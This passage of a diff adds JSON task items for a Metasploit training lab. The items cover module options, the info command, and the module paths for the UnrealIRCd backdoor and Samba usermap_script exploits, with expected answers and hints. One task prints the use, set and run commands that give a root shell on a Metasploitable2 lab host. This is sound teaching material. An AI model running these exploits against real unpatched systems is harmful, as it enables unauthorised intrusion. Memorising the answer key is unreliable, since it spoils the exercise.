+            "instructions": "Every Metasploit exploit requires at minimum two pieces of information: the **target** (remote host) and your **listener** (local host). These are set as module options.\n\n**Key options in most exploits:**\n\n| Option   | Meaning                        |\n|----------|-------------------------------|\n| `RHOSTS` | Remote host(s) — the target   |\n| `RPORT`  | Remote port — target's port   |\n| `LHOST`  | Local host — your IP          |\n| `LPORT`  | Local port — your listener    |\n\nYou configure these with `set <OPTION> <value>`:\n```\nset RHOSTS metasploitable2\nset LHOST 0.0.0.0\n```\n\nAfter setting options you can verify them with `show options` — this lists required and optional settings and whether they are configured.\n\nWhat is the **option name** used to specify the **target IP address**?",
+            "expected_answer": "RHOSTS",
+            "autosolve_commands": [],
+            "sort_order": 2,
+            "hints": [
+              {
+                "hint_id": "a6b28622-d5db-4628-af81-969fe45bb192",
+                "hint_text": "The option name starts with R (for Remote).",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "8effdd82-d155-4c24-9204-8c4e3389a5d0",
+                "hint_text": "LHOST is your attacker IP; the *remote* host option starts with RH.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "6c917292-544e-4ce4-9182-cdd5e40227dd",
+            "title": "What msfconsole command shows module details?",
+            "instructions": "Before running an exploit it is good practice to read its documentation. Metasploit includes detailed information for every module including:\n- A description of the vulnerability it exploits\n- The CVE references\n- Required and optional options\n- Author and reliability rating\n\nYou access this with a single-word command inside msfconsole (after selecting a module with `use`):\n\n```\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\ninfo\n```\n\nThe output will show you everything about the module — including that this exploit targets **CVE-2010-2075** and reliably gives a shell on the target.\n\nWhat single-word msfconsole command **shows detailed module information**?",
+            "expected_answer": "info",
+            "autosolve_commands": [],
+            "sort_order": 3,
+            "hints": [
+              {
+                "hint_id": "742b29d6-b36c-4e2e-a773-ee436b6908f4",
+                "hint_text": "It's a common English word meaning 'information'.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "c0b2b27d-2592-44e4-8d9d-2783e145a9e5",
+            "title": "What Metasploit module exploits the UnrealIRCd backdoor?",
+            "instructions": "Now search for the UnrealIRCd exploit module. Inside msfconsole, run:\n\n```\nsearch unreal_ircd\n```\n\nYou will see a table of matching modules. Find the **exploit** module (not auxiliary or post) that targets the UnrealIRCd backdoor. The module path follows the Metasploit naming convention:\n\n```\n<type>/<platform>/<service>/<module_name>\n```\n\nFor example: `exploit/unix/irc/<name>`\n\n**Auto-Solve note:** The auto-solve will run this search in your terminal and extract the module path automatically.\n\nWhat is the **full module path** for the UnrealIRCd backdoor exploit?",
+            "expected_answer": "exploit/unix/irc/unreal_ircd_3281_backdoor",
+            "autosolve_commands": [
+              "msfconsole -q -x 'search unreal_ircd; exit' 2>/dev/null | grep unreal_ircd | grep exploit | awk '{print $2}'"
+            ],
+            "sort_order": 4,
+            "hints": [
+              {
+                "hint_id": "e1587464-8d6d-4fe0-be7c-137f925a259b",
+                "hint_text": "Run `search unreal_ircd` inside msfconsole.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "52eb4a87-46ea-4bba-8926-59d4dd282ff5",
+                "hint_text": "The module path follows: `exploit/unix/irc/<name>`.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "68013bb2-0c63-4f77-8ef3-b5e379039a82",
+            "title": "What Metasploit module exploits the Samba vulnerability?",
+            "instructions": "The second critical vulnerability is in Samba — **CVE-2007-2447**, known as the \"username map script\" vulnerability. It allows unauthenticated remote code execution by injecting shell commands into the Samba username field.\n\nSearch for it in msfconsole:\n```\nsearch usermap_script\n```\n\nFind the **exploit** module in the results. The module path follows the pattern:\n```\nexploit/multi/samba/<name>\n```\n\nOnce you find it, you can exploit Metasploitable2's Samba service with just three commands:\n```\nuse exploit/multi/samba/usermap_script\nset RHOSTS metasploitable2\nrun\n```\n\nThis gives you a **root shell** — no password required. That's the power (and danger) of unpatched, vulnerable services.\n\nWhat is the **full module path** for the Samba usermap_script exploit?",
+            "expected_answer": "exploit/multi/samba/usermap_script",
+            "autosolve_commands": [
+              "msfconsole -q -x 'search usermap_script; exit' 2>/dev/null | grep usermap_script | grep exploit | awk '{print $2}'"
+            ],
+            "sort_order": 5,
+            "hints": [
+              {
+                "hint_id": "05e54684-ef14-4eaa-a448-69d22c36ef70",
+                "hint_text": "Run `search usermap_script` inside msfconsole.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "fe0e123b-788a-4ea5-b4c4-5df12fa1c062",
+                "hint_text": "The module path starts with `exploit/multi/samba/`.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  }
+]
